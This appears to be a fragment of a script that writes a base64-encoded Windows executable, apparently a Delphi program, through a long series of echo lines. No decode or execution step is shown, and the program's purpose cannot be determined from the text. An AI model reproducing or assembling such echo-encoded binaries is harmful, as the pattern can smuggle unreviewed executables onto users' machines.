echo QXJyYXkgAAD/////BgAAAEJ5UmVmIAAAU1aL8ovYi8PoI+r//2bHAwoAiXMIXlvD
echo ugQAAoDo3v///8OQUOZAABEDLjAyBAAAAAAAAAD/////zMNAAAhWYXJpYW50c4vA
echo VYvsU1a+IIhBAGgkiEEA6Cxx//8z0lVo0eZAAGT/MmSJIosG6C9g//+L2EuD+wB8
echo GIsGiwSYOwUYQ0EAdAXo3Uj//0uD+/916DPAWllZZIkQaNjmQABoJIhBAOiIcf//
echo w+mWTf//6+5eW13DVYvs6LgBAABdwgQAU1ZXUYvxi/qL2IvUZosG6BgCAACEwHQU
echo ZotDBFCLzovXi0QkBIsY/1Mc6weLw+h5AQAAWl9eW8NVi+yDxPhTVleL8YlV/IvY
echo i30IZjt7BHQfjVX4ZosG6NABAACEwHQQV4vOi1X8i0X4ixj/UxzrB4vD6DUBAABf
echo XltZWV3CBABVi+zoLAEAAF3CBABVi+xRU1ZXi/qL8I1F/1CL14vGixj/UzgzwIpF
echo /4tVCI0UUoHCcENBAIpEAtZfXltZXcIEAI1AAFNWV1VRi/GL+ovYi8yL1ovDiyj/
echo VQyEwHQSZosEJFCLzovXi8OLGP9THOsHi8PotQAAAFpdX15bw41AAFWL7IPE+OhN
echo Sv//iFX7iUX8aCSIQQDorW///zPSVWhL6EAAZP8yZIkii0X8ZotABGaFwHQWD7fA
echo ixUgiEEAiw0YQ0EAiYyCAPz//zPAWllZZIkQaFLoQABoJIhBAOgOcP//w+kcTP//
echo 6+6KVfuA4vyLRfzoIEf//4B9+wB+CItF/Oi6Sf//WVldw4vAM8DDkFWL7ItVCGaL
echo QARmiQKwAV3CBACQZscBCACwAcPoH+D//8OLwOgH4f//w4vA6Nfk///Di8BVi+yL
echo VQhmi0AEZokCsAFdwgQAkOjX////w4vAVYvs6NT///9dwggAVYvsg8j/XcIEAIvA
echo VYvsg8j/XcIEAIvAVYvsU4tdCItNEItVDIvD6ERH//+EwHQEM8DrBbgCQACAW13C
echo DACLwFWL7FFTVleL8ovYgz0giEEAAHQOZoH7AAFyB2aB+/8HdgQzwOsCsAGIRf+A
echo ff8AdH5oJIhBAOhhbv//M8BVaLzpQABk/zBkiSChIIhBAOhhXf//D7f7i9eB6gAB
echo AAA7wg+fRf+Aff8AdCahIIhBAIuEuAD8//+JBoM+AHQKiwY7BRhDQQB1BDPA6wKw
echo AYhF/zPAWllZZIkQaMPpQABoJIhBAOidbv//w+mrSv//6+6KRf9fXltZXcNVi+wz
echo wFVoO+pAAGT/MGSJIP8FHIhBAHVI6Ib8//9oJIhBAOi0bf//uCCIQQCLFUzmQADo
echo jF7//7gcQ0EAuRUAAACLFQAQQADoY1n//7gQQ0EA6CFQ//+4/IdBAOg/5v//M8Ba
echo WVlkiRBoQupAAMPpLEr//+v4XcNVi+wzwFVo5epAAGT/MGSJIIMtHIhBAAFzebj8
echo h0EA6Nj7//+4gM1AAKMMiEEAuKjJQACjEIhBALq4yEAAiRUUiEEAoxiIQQC4bNBA
echo AIsVpHRBAIkCuDTjQACLFdhzQQCJAriA00AAixXsdEEAiQK4rNZAAIsVdHVBAIkC
echo uNTdQACLFfh0QQCJAmgkiEEA6Hlt//8zwFpZWWSJEGjs6kAAw+mCSf//6/hdw4vA
echo YIZBAKr/AABghkEAq/8AAGCGQQCs/wAAYIZBAK3/AABghkEArv8AAGCGQQCv/wAA
echo YIZBAJD/AABghkEAkf8AAGCGQQCS/wAAYIZBAJP/AABghkEAlP8AAGCGQQCV/wAA
echo YIZBAJb/AABVi+wzwFVofetAAGT/MGSJIP8FPIhBADPAWllZZIkQaITrQADD6epI
echo ///r+F3Di8CDLTyIQQABw/////8FAAAARmFsc2UAAAD/////BAAAAFRydWUAAAAA
echo /////wEAAAAuAAAAVYvsM8BVaALsQABk/zBkiSD/BUCIQQB1H7iMQ0EA6GVO//+4
echo hENBALkCAAAAixUAEEAA6IhX//8zwFpZWWSJEGgJ7EAAw+llSP//6/hdw5CDLUCI
echo QQABw1WL7DPAVWg57EAAZP8wZIkg/wVEiEEAM8BaWVlkiRBoQOxAAMPpLkj//+v4
echo XcOLwIMtRIhBAAHDmOxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACY7EAA
echo DAAAAEBcQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AAAxFU3RyZWFt
echo RXJyb3KNQAD07EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPTsQAAMAAAA
echo TOxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AAEEVGaWxlU3RyZWFt
echo RXJyb3KNQABU7UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFTtQAAMAAAA
echo qOxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AADUVGQ3JlYXRlRXJy
echo b3KLwLDtQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsO1AAAwAAACo7EAA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAALRUZPcGVuRXJyb3II7kAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjuQAAMAAAATOxAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQACAL0AAC0VGaWxlckVycm9yYO5AAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAABg7kAADAAAALztQACcMUAAqDFAAKwxQACwMUAA
echo pDFAACgvQABEL0AAgC9AAApFUmVhZEVycm9ykLjuQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAuO5AAAwAAAC87UAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIAvQAALRVdyaXRlRXJyb3IQ70AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAABDvQAAMAAAAQFxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AA
echo CkVMaXN0RXJyb3KQaO9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABo70AA
echo DAAAAEBcQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AABBFU3RyaW5n
echo TGlzdEVycm9yjUAAyO9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADY70AA
echo EAAAAAwQQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AAZPhAAOj5QADI+kAA
echo uPhAADT5QAAFVExpc3SLwCzwQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo LPBAACQAAAAMEEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AACD7QAALVFRo
echo cmVhZExpc3SE8EAAAAAAAAAAAAAAAAAAsPBAAAAAAAAAAAAAkPBAAJ7wQAAEAAAA
echo DBBAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQAC8+0AAzPxAANT8QADo+0AA
echo AgD///7/iP1AANj8QAALVFBlcnNpc3RlbnSLwLDwQAAHC1RQZXJzaXN0ZW50hPBA
echo AGAQQAAAAAdDbGFzc2VzAACNQADY8EAADw9JU3RyaW5nc0FkYXB0ZXKAEEAAATQv
echo nHPsUtARnqYAIK89gtoHQ2xhc3NlcwIA//+LwFjxQAAAAAAAAAAAANjxQAD48UAA
echo AAAAAAAAAAAAAAAA6vFAABAAAAA48EAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIz9QADM/EAAxP9AALz+QAA8KUAASAJBADwpQABQAkEAqAJBAEQHQQB4B0EA
echo 4AhBAGgJQQAoCkEAsApBALz9QADg/UAABP5AADwpQAA8KUAAYAFBAFQCQQDQA0EA
echo XARBADAFQQA8KUAAZAVBAJQFQQDoBUEAlAZBACwIQQCECEEAGAlBAA4AAAAAAAEA
echo AADU8EAADAAAAAhUU3RyaW5nc5D48UAABwhUU3RyaW5nc1jxQACs8EAAAAAHQ2xh
echo c3NlcwAAi8Ac8kAADgtUU3RyaW5nSXRlbQgAAAABAAAAABBAAAAAAACNQACI8kAA
echo AAAAAAAAAAAAAAAAMPNAAAAAAAAAAAAAAAAAACDzQAAwAAAADPFAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQADwCkEAzPxAAMT/QAC8/kAAmA1BAMwNQQDQDUEA
echo 1A1BAKgCQQBID0EApA9BAHgQQQBoCUEAlBBBAAgRQQBMC0EAWAtBAAT+QAD0C0EA
echo NAxBAKAMQQBUAkEAMA5BAFwEQQAwBUEAbA5BAHwOQQCUBUEA6AVBAJQGQQAsCEEA
echo hAhBABgJQQC8C0EA2AtBANAOQQAgDUEAwBBBANAQQQALVFN0cmluZ0xpc3Qw80AA
echo BwtUU3RyaW5nTGlzdIjyQAD08UAAAAAHQ2xhc3NlcwAAjUAAoPNAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAC880AABAAAAAwQQACcMUAAqDFAAKwxQACwMUAA
echo pDFAACgvQABEL0AAgC9AAEQRQQCQEUEAlBFBADwpQAA8KUAANBJBALgSQQAHVFN0
echo cmVhbRD0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALPRAAAgAAABU80AA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQABEEUEA6BNBAPwTQQCcE0EA
echo rBNBADQSQQC8E0EADVRIYW5kbGVTdHJlYW2LwIj0QAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAApPRAAAgAAADE80AAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AALwVQQBEEUEA6BNBAPwTQQCcE0EArBNBADQSQQC8E0EAC1RGaWxlU3RyZWFt
echo /PRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD89EAAFAAAAAwQQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AA3PVAAAlUUmVnR3JvdXCLwFT1QAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVPVAACQAAAAMEEAAnDFAAKgxQACsMUAA
echo sDFAAKQxQAAoL0AARC9AAFT3QAAKVFJlZ0dyb3Vwc5BVi+xRU1ZXhNJ0CIPE8Ohl
echo PP//i/mIVf+L2DPSi8Po3Tn//7IBoXzvQADo0Tn//4lDBLIBoTzyQADowjn//4lD
echo CLIBoXzvQADoszn//4vwiXMMi8aL1+jJAgAAi8OAff8AdA/oaDz//2SPBQAAAACD
echo xAyLw19eW1ldw4vAU1boXTz//4vai/CL04Di/IvG6I05//+LRgTolTn//4tGCOiN
echo Of//i0YM6IU5//+E234Hi8boEjz//15bw41AAFNWi9qL8IXbdBCLxujHUv//O9h0
echo BTPAXlvDsAFeW8OQU1ZXi/qL8ItGDItYCEuD+wB8JYvTi0YM6GcDAACL1+i8////
echo hMB0CovTi0YM6GICAABLg/v/dduLRgSLWAhLg/sAfCWL04tGBOg2AwAAi9foi///
echo /4TAdAqL04tGBOgxAgAAS4P7/3Xbi0YIixD/UhSL2EuD+wB8JYvTi0YIiwj/URiL
echo 1+hW////hMB0CovTi0YIiwj/UUhLg/v/ddtfXlvDi8BTVleE0nQIg8Tw6Ok6//+L
echo 2ov4M9KLx+hkOP//sgGhfO9AAOhYOP//iUcEjUcIUOg8Yf//iw048EAAsgGhsPRA
echo AOg6/v//i/CLRwSL1uhSAQAAxkYQAYvHhNt0D+jvOv//ZI8FAAAAAIPEDIvHX15b
echo w41AAFNWV1Xo4zr//4vai/CNRghQ6D5g//+LRgSLaAhNhe18FkUz/4tGBIvX6D4C
echo AADoCTj//0dNde2LRgTo/Tf//4vTgOL8i8bo4Tf//4TbfgeLxuh+Ov//XV9eW8OQ
echo g8AIUOj3X///w4vAg8AIUOiTYP//w4vAU1ZXVYvqi/iLRwSLWAhLg/sAfDWLRwSL
echo 0+jaAQAAi/CL1YvG6Ev+//+LRgyDeAgAdRGLxuiPN///i0cEi9PoxQAAAEuD+/91
echo y11fXlvDi8BVi+xTi9ihWIhBAOiI////M8BVaFr4QABk/zBkiSCL06FYiEEA6Ib/
echo //8zwFpZWWSJEGhh+EAAoViIQQDoY////8PpDTz//+vuW13DU1bo1Tn//4vai/CL
echo xosQ/1IIhNt+B4vG6Kc5//9eW8NTVleL+ovYi3MIO3MMdQaLw4sQ/xKLQwSJPLD/
echo QwiF/3QLM8mL14vDixj/UwSLxl9eW8OQU4vYM9KLw+iUAQAAM9KLw+hPAQAAW8OQ
echo U1ZXi/KL2IX2fAU7cwh8D4sVJHVBAIvOiwPofQAAAIvWi8PoyAAAAIv4/0sIi0MI
echo O/B9GSvGi8jB4QKLQwSNFLCLQwSNRLAE6JMu//+F/3QLsQKL14vDixj/UwRfXlvD
echo i0UEw1NWg8T4i/GL2uju////UIl0JATGRCQIAI1EJARQagCLy7IBocTuQADor6T/
echo /+k+O///WVpeW8OQVYvsagBTVovxi9ozwFVotPlAAGT/MGSJII1V/IvD6C1a//+L
echo VfyLzqF870AA6Jb///8zwFpZWWSJEGi7+UAAjUX86JFA///D6bM6///r8F5bWV3D
echo U1aL8ovYhfZ8BTtzCHwPixUkdUEAi86LA+iO////i0MEiwSwXlvDkItQDIP6QH4O
echo i8qFyXkDg8EDwfkC6xGD+gh+B7kQAAAA6wW5BAAAAAPKi9HoBAAAAMONQABTVovy
echo i9g7cwh8CIH+////B34PixW4dEEAi86LA+gu////O3MMdBCL1sHiAo1DBOgYLP//
echo iXMMXlvDi8BTVldVi/KL2IX2fAiB/v///wd+D4sVfHRBAIvOiwPo8f7//ztzDH4J
echo i9aLw+iT////i0MIO/B+GYtTBI0UgovOK8iLwcHgAjPJkuhdL///6xeL6E2L/iv9
echo fw5Pi9WLw+gU/v//TUd184lzCF1fXlvDw41AAFNWhNJ0CIPE8Oj+Nv//i9qL8DPS
echo i8boeTT//41GCFDoYF3//7IBoXzvQADoZDT//4lGBMZGIACLxoTbdA/oIjf//2SP
echo BQAAAACDxAyLxl5bw41AAFWL7IPE+OgVN///iFX7iUX8i0X86GMAAAAzwFVogvtA
echo AGT/MGSJIItF/ItABOg+NP//ilX7gOL8i0X86CA0//8zwFpZWWSJEGiJ+0AAi0X8
echo 6DsAAACLRfyDwAhQ6Cdc///D6eU4///r5IB9+wB+CItF/OiRNv//WVldw5BTi9iN
echo QwhQ6Ahc//+LQwRbw41AAIPACFDon1z//8OLwFNW6H02//+L2ovwi8bozhoAAIvT
echo gOL8i8bopjP//4TbfgeLxuhDNv//XlvDhdJ0BpKLCP8RwzPS6AMAAADDi8BVi+yB
echo xOz+//9TVjPJiU38i/KL2DPAVWiy/EAAZP8wZIkghfZ0HY2V/P7//4sG6Nky//+N
echo lfz+//+NRfzoa0D//+sNjUX8usj8QADokD7//4tF/ImF7P7//8aF8P7//wuNlfz+
echo //+LA+ifMv//jYX8/v//iYX0/v//xoX4/v//BI2F7P7//1BqAYsNhHRBALIBoURi
echo QADoNaL//+gIOP//M8BaWVlkiRBoufxAAI1F/OiTPf//w+m1N///6/BeW4vlXcMA
echo /////wMAAABuaWwAkugq////w5DDjUAAVYvsgcT8/v//U1ZXM8mJTfyL+ovYM8BV
echo aG39QABk/zBkiSCNlfz+//+LA+gAMv//jZX8/v//i8fokz///4vDZr7//+hQNP//
echo hcB0M4vDZr7//+hBNP//jVX8Zr7+/+g1NP//g338AHQW/3X8aIT9QAD/N4vHugMA
echo AADoSUD//zPAWllZZIkQaHT9QACNRfzo2Dz//8Pp+jb//+vwX15bi+VdwwD/////
echo AQAAAC4AAAAzwMOQU1borTT//4vai/Az0ovG6EQLAACL04Di/IvG6BD+//+E234H
echo i8bocTT//15bw4vAU1ZXVYvqi/CLxosQ/1IUi/iLzYvXi8aLGP9TYIvHXV9eW8OQ
echo U1ZXi/mL2IvDiwj/UTiL8IvPi9aLw4sY/1Mki8ZfXlvDjUAAVYvsg8T0U1ZXM8mJ
echo TfSJVfiJRfwzwFVoq/5AAGT/MGSJIItF/OgmAQAAM8BVaI7+QABk/zBkiSCLRfiL
echo EP9SFIvwToX2fC1GM9uNTfSL04tF+Is4/1cMi0X0UIvTi0X4iwj/URiLyItF/FqL
echo OP9XPENOddYzwFpZWWSJEGiV/kAAi0X86IMBAADD6dk1///r8DPAWllZZIkQaLL+
echo QACNRfTomjv//8PpvDX//+vwX15bi+Vdw41AAFWL7FFTVovaiUX8i8OLFQzxQADo
echo SDL//4TAdGuLRfzodAAAADPAVWg8/0AAZP8wZIkgi0X8ixD/UkSL84pGBItV/IhC
echo BIpGB4tV/IhCB4pGBotV/IhCBopGBYtV/IhCBYvWi0X8iwj/UUAzwFpZWWSJEGhN
echo /0AAi0X86NUAAADD6Ss1///r8IvTi0X86Jv8//9eW1ldw4vAU4vYg3sIAHUJsgGL
echo w4sI/1Ew/0MIW8OQVYvsU1aLRQiLQPyLcCCF9nQtswGLRQiLxosVDPFAAOiMMf//
echo hMB0J4tFCIvWi0UIi0D46IAAAACL2IDzAesQi0UIi0D4ixD/UhSFwA+fw4vDXltd
echo w41AAFWL7IPE+FOJVfyJRfiLRfhQaHwHQQCLRfhQaCwKQQBV6IP///9Zi8i6CABB
echo AItF/IsY/1MEW1lZXcMAAP////8HAAAAU3RyaW5ncwD/SAiDeAgAdQcz0osI/1Ew
echo w41AAFWL7IPE7FNWVzPJiU3wiU3siVX4iUX8M8BVaLkAQQBk/zBkiSDGRfcAi0X8
echo ixD/UhSL2ItF+IsQ/1IUO9h1O4vzToX2fDBGM9uNTfCL04tF/Is4/1cMi0XwUI1N
echo 7IvTi0X4izj/VwyLVexY6Jg9//91CENOddPGRfcBM8BaWVlkiRBowABBAI1F7LoC
echo AAAA6LA5///D6a4z///r64pF919eW4vlXcOLwItFBMNTVoPE+Ivxi9ro7v///1CJ
echo dCQExkQkCACNRCQEUGoAi8uyAaEc70AA6BOd///pojP//1laXlvDkFWL7GoAU1ZX
echo i/mL8ovYM8BVaFABQQBk/zBkiSCNVfyLxuiOUv//i1X8i8+Lw+iW////M8BaWVlk
echo iRBoVwFBAI1F/Oj1OP//w+kXM///6/BfXltZXcONQABVi+yDxPBTVlcz24ld8Ild
echo 9Ivxi9qJRfwzwFVoOAJBAGT/MGSJIItF/OjG/f//M8BVaBYCQQBk/zBkiSCNTfSL
echo 04tF/Is4/1cMi9OLRfyLCP9RGIlF+I1N8IvWi0X8izj/VwyLTfCL04tF/Is4/1cg
echo i9aLRfyLCP9RGIvIi9OLRfyLGP9TJItN9IvWi0X8ixj/UyCLTfiL1otF/IsY/1Mk
echo M8BaWVlkiRBoHQJBAItF/Oj7/f//w+lRMv//6/AzwFpZWWSJEGg/AkEAjUXwugIA
echo AADoMTj//8PpLzL//+vrX15bi+Vdw4vAixD/UhTDi8AzwMOQVYvsagBTi9gzwFVo
echo mQJBAGT/MGSJII1V/IvDiwj/URyLRfzoZDz//+hnbv//i9gzwFpZWWSJEGigAkEA
echo jUX86Kw3///D6c4x///r8IvDW1ldw4vAVYvsg8TgU1ZXM8mJTeCJTeiJTeSJVfiJ
echo RfwzwFVoswNBAGT/MGSJIItF/IsQ/1IUiUXwM9uNReS6zANBAOjyN///i3XwToX2
echo fDJGx0X0AAAAAI1N4ItV9ItF/Is4/1cMi0Xg6NA5//+L+ItF5OjGOf//A/gD3/9F
echo 9E511otF+IvLM9LoBDj//4tF+IsAiUXsi3XwToX2fFhGx0X0AAAAAI1N6ItV9ItF
echo /IsY/1MMi0Xo6II5//+L2IXbdBCLVeyLReiLy+g/JP//AV3si0Xk6GQ5//+L2IXb
echo dBCLVeyLReSLy+ghJP//AV3s/0X0TnWwM8BaWVlkiRBougNBAI1F4LoDAAAA6LY2
echo ///D6bQw///r619eW4vlXcMAAAD/////AgAAAA0KAABVi+yDxPRTVlczyYlN9IlV
echo /IvYM8BVaEgEQQBk/zBkiSCLw4sQ/1IUi/BOhfZ8LEbHRfgAAAAAjU30i1X4i8OL
echo OP9XDItV9ItN/IvDizj/VzSFwHQN/0X4TnXcx0X4/////zPAWllZZIkQaE8EQQCN
echo RfTo/TX//8PpHzD//+vwi0X4X15bi+Vdw41AAFWL7IPE6FNWM8mJTeiJTeyJTfSJ
echo VfyL2DPAVWgfBUEAZP8wZIkgi8OLEP9SFEiFwHxnQIlF8MdF+AAAAACNTfSLVfiL
echo w4sw/1YMi8PoDwYAAIvQjUXs6HU3//+LReyLVfToaqT//4vwhfZ0JY1F6FCLzkm6
echo AQAAAItF9OhkOv//i1Xoi038i8OLMP9WNIXAdA//Rfj/TfB1pMdF+P////8zwFpZ
echo WWSJEGgmBUEAjUXougIAAADoUjX//41F9OgmNf//w+lIL///6+OLRfheW4vlXcOQ
echo U1ZXVYvqi/iLx4sQ/1IUi9hLhdt8FEMz9ovWi8eLCP9RGDvodAdGS3Xvg87/i8Zd
echo X15bw1WL7FFTVleJTfyL+ovwi038i9eLxosY/1Ngi00Ii9eLxosY/1MkX15bWV3C
echo BACLwFWL7FFWi/BqIIvKoTz0QACyAeh5DgAAiUX8M8BVaNwFQQBk/zBkiSCLVfyL
echo xosI/1FsM8BaWVlkiRBo4wVBAItF/Oi1Kf//w+mLLv//6/BeWV3DkFWL7IPE+FNW
echo M8mJTfiL2olF/DPAVWiFBkEAZP8wZIkgi0X86ET5//8zwFVoaAZBAGT/MGSJIIvD
echo ixD/Eovwi8Po9woAACvwjUX4i84z0uj5NP//i1X4i86Lw4sY/1MMi1X4i0X8iwj/
echo USwzwFpZWWSJEGhvBkEAi0X86Kn5///D6f8t///r8DPAWllZZIkQaIwGQQCNRfjo
echo wDP//8Pp4i3//+vwXltZWV3Di8BVi+yDxPhTVlcz24ld+Ivxi9qJRfwzwFVoNQdB
echo AGT/MGSJIDvzdGSLRfzokfj//zPAVWgYB0EAZP8wZIkgjU34i9OLRfyLOP9XDIvT
echo i0X8iwj/URiL+IvTi0X8iwj/UUhXi034i9aLRfyLGP9TZDPAWllZZIkQaB8HQQCL
echo Rfzo+fj//8PpTy3//+vwM8BaWVlkiRBoPAdBAI1F+OgQM///w+kyLf//6/BfXltZ
echo WV3DkFNWV1VRiQwki/qL8IvXi8aLCP9RGIvoi9eLxosI/1FIVYtMJASL14vGixj/
echo U2RaXV9eW8PDjUAAVYvsg8T0M8mJTfSJVfiJRfwzwFVoIAhBAGT/MGSJIItF+Ohx
echo EAAAi0X86Kn3//8zwFVo+wdBAGT/MGSJIItF/IsQ/1JE6xaNVfSLRfjokhAAAItV
echo 9ItF/IsI/1E4i0X46IcPAACEwHTeM8BaWVlkiRBoAghBAItF/OgW+P//w+lsLP//
echo 6/CLRfjoEhAAADPAWllZZIkQaCcIQQCNRfToJTL//8PpRyz//+vwi+Vdw5BVi+xR
echo VovwaP//AACLyqE89EAAsgHo3gsAAIlF/DPAVWh3CEEAZP8wZIkgi1X8i8aLCP9R
echo eDPAWllZZIkQaH4IQQCLRfzoGif//8Pp8Cv//+vwXlldw4vAVYvsagBTVovyi9gz
echo wFVo0QhBAGT/MGSJII1V/IvDiwj/URyLRfzoMTT//4vIi1X8i8bobQoAADPAWllZ
echo ZIkQaNgIQQCNRfzodDH//8Ppliv//+vwXltZXcONQADDjUAAU1aL8ovYg3sMAHQI
echo i0MMixD/UhCNQwyL1uhKRv//g3sMAHQKi9OLQwyLCP9RDF5bw41AAFWL7GoAU1aL
echo 8ovYM8BVaFsJQQBk/zBkiSCNRfyL1ugBM///i1X8i8OLCP9RLDPAWllZZIkQaGIJ
echo QQCNRfzo6jD//8PpDCv//+vwXltZXcOQVYvsg8T4UzPJiU34i9qJRfwzwFVoHApB
echo AGT/MGSJIItF/OjF9f//M9JVaP8JQQBk/zJkiSKLRfyLEP9SRIXbdEDrOYvD6wFD
echo ihOE0nQKgOoKdAWA6gN174vLK8iNVfiS6Gcx//+LVfiLRfyLCP9ROIA7DXUBQ4A7
echo CnUBQ4A7AHXCM8BaWVlkiRBoBgpBAItF/OgS9v//w+loKv//6/AzwFpZWWSJEGgj
echo CkEAjUX46Ckw///D6Usq///r8FtZWV3Dw41AAFWL7IPE9FNWVzPJiU30iVX4iUX8
echo M8BVaKIKQQBk/zBkiSCLRfjoShMAAItF/IsQ/1IUi9hLhdt8H0Mz9o1N9IvWi0X8
echo izj/VwyLVfSLRfjoyBMAAEZLdeSLRfjoHBMAADPAWllZZIkQaKkKQQCNRfTooy//
echo /8PpxSn//+vwX15bi+Vdw4vCi9Hoq17//8OLwFOL2PZDBAR1CbI9i8PoBgAAAIpD
echo B1vDkFNWi9qL8DpeB3UG9kYEBHUHgE4EBIheB15bw5BTVuhJJ///i9qL8DPAiUYg
echo iUYkM8CJRiiJRiyL04Di/IvG6HXy//+LRhSFwHQQi8iLRhCLFRjyQADoTjj//zPA
echo iUYUM9KLxosI/1EohNt+B4vG6OEm//9eW8OLwFMzyYsY/1M8W8OLwFNWV1VRi/mL
echo 8ovYgHscAHUIi0MUiQQk6y6LzIvWi8OLKP+VjAAAAITAdByKQx0sAXIm/sh0AusP
echo ixUsdEEAM8mLw+hp9f//V4vOi1QkBIvDixj/k4gAAACLBCRaXV9eW8ONQABTg3gI
echo AHURZoN4IgB0CovYi9CLQyT/UyBbw4vAU4N4CAB1EWaDeCoAdAqL2IvQi0Ms/1Mo
echo W8OLwFOL2IN7FAB0M4vDixD/koQAAACLQxCLSxSLFRjyQADoZDf//zPAiUMUM9KL
echo w4sI/1Eoi8OLEP+SgAAAAFvDi8BTVovyi9iF9nwFO3MUfA+LFSR1QQCLzovD6Lb0
echo //+Lw4sQ/5KEAAAAi0MQjQTwixUY8kAA6Ps3////SxSLQxQ78H0ZK8aLyMHhA4tD
echo EI0U8ItDEI1E8AjoIBv//4vDixD/koAAAABeW8ONQABTVleL+Yvyi9iF9nwFO3MU
echo fA+LFSR1QQCLzovD6Ef0//+F/3wFO3sUfA+LFSR1QQCLz4vD6C/0//+Lw4sQ/5KE
echo AAAAi8+L1ovD6A4AAACLw4sQ/5KAAAAAX15bw1OLWBCNFNOLQBCNBMiLCosYiRqJ
echo CItKBItYBIlaBIlIBFvDkFNWV1WDxPCJTCQEiRQki/jGRCQIADP2i0cUSIlEJAw7
echo dCQMfz+LXCQMA97R64tHEIsU2IsMJIvHiyj/VTSFwH0FjXMB6xiL00qJVCQMhcB1
echo DcZEJAgBgH8dAXQCi/M7dCQMfsGLRCQEiTCKRCQIg8QQXV9eW8OLwFNWV4v5i/KL
echo 2IX2fAU7cxR8D4sVJHVBAIvOi8PoT/P//4vHi1MQixTy6NIs//9fXlvDi8CLQBjD
echo i0AUw1NWi/KL2IX2fAU7cxR8D4sVJHVBAIvOi8PoFvP//4tDEItE8AReW8NWi1AY
echo g/pAfg6L8oX2eQODxgPB/gLrEYP6CH4HvhAAAADrBb4EAAAAA/KL1osI/1EoXsOQ
echo U1ZRi/KL2IB7HAB1DovWi8PoivX//4kEJOsZi8yL1ovDixj/k4wAAACEwHUHxwQk
echo /////4sEJFpeW8OQU1aL8GoAi8aLGP9TZF5bw1WL7FNWV4v5i/KL2IB7HAB0D4sV
echo eHRBADPJi8Poa/L//4X2fAU7cxR+D4sVJHVBAIvOi8PoU/L//4tFCFCLz4vWi8OL
echo GP+TiAAAAF9eW13CBACLwFWL7FNWV4v5i/KL2IvDixD/koQAAACLQxQ7Qxh1B4vD
echo 6Af///+LQxQ78H0di1MQjVTyCFKLUxCNFPIrxovIweEDi8Ja6JcY//+LQxCNBPCL
echo 8DPAiQaLRQiJRgSLxovX6GQr////QxSLw4sQ/5KAAAAAX15bXcIEAFNWV4v5i/KL
echo 2IB7HAB0D4sVeHRBADPJi8PoovH//4X2fAU7cxR8D4sVJHVBAIvOi8PoivH//4vD
echo ixD/koQAAACLQxCNBPCL1+gDK///i8OLEP+SgAAAAF9eW8OQU1ZXi/mL8ovYhfZ8
echo BTtzFHwPixUkdUEAi86Lw+hD8f//i8OLEP+ShAAAAItDEIl88ASLw4sQ/5KAAAAA
echo X15bw1WL7IPE8FNWiU30iVX4iUX8i134i3X0i0X4A0X00eiJRfDrAUOLTfCL04tF
echo /P9VCIXAfPDrAU6LTfCL1otF/P9VCIXAf/A783wgi86L04tF/OjC/P//O13wdQWJ
echo dfDrCDt18HUDiV3wQ0478323O3X4fhGLRQhQi86LVfiLRfzofP///4ld+Dtd9HyF
echo XluL5V3CBABTVovyi9iL1sHiA41DEOjdFf//iXMYXlvDjUAAhNJ0CYsQ/5KEAAAA
echo w4sQ/5KAAAAAw4vAU4tYEIsMy4tYEIsU04sY/1M0W8O6rBBBAIsI/5GUAAAAw4vA
echo U1aL8ovYgHscAHUog3sUAX4ii8OLEP+ShAAAAFaLSxRJM9KLw+jq/v//i8OLEP+S
echo gAAAAF5bw5CAeB4AdAqLwovR6BVY///Di8KL0ehDWP//w4vAg8T4agBqALIBiwj/
echo URiJBCSJVCQEiwQki1QkBFlaw5BTg8Twi9hqAGoAsgGLw4sI/1EYiUQkCIlUJAxq
echo AGoAsgKLw4sI/1EYiQQkiVQkBP90JAz/dCQMM9KLw4sI/1EYiwQki1QkBIPEEFvD
echo w41AAFWL7IvIg30M/3ULgX0IAAAAgHIX6wJ8E4N9DAB1C4F9CP///392G+sCfheL
echo DVB1QQCyAaEgX0AA6L+M///oziL//4tFCIvQi8GLCP9RBF3CCACLwFWL7IHE+P7/
echo /42V+P7//4tFCItA/IsA6AQd//+Nhfj+//+JRfjGRfwEjUX4UGoAiw1sdUEAsgGh
echo TOxAAOijjP//6HYi//+L5V3Di8BVi+yDxOBTVmaJTeaL8olF/I1d4ItF/IlF9IsA
echo i0AYiUXwi0X86KIc//+JA+sJiwPosxz//4kDgzsAdAqLAzsFVPNAAHXogzsAdQdV
